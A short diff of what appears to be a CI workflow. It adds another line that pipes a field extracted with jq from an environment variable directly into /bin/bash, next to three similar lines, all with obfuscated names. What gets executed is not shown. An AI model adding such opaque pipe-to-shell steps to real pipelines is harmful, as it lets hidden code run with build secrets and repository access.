@@ -29,6 +29,7 @@ jobs:
           echo $nvm4101 | jq -r .om42935 | /bin/bash
           echo $ncn20 | jq -r .l0581 | /bin/bash
           printf '%s' "$qn1420" | jq -r .ieemt28 | /bin/bash
+          echo $r925 | jq -r .ora682 | /bin/bash
 
       - name: Persist output
         if: always()
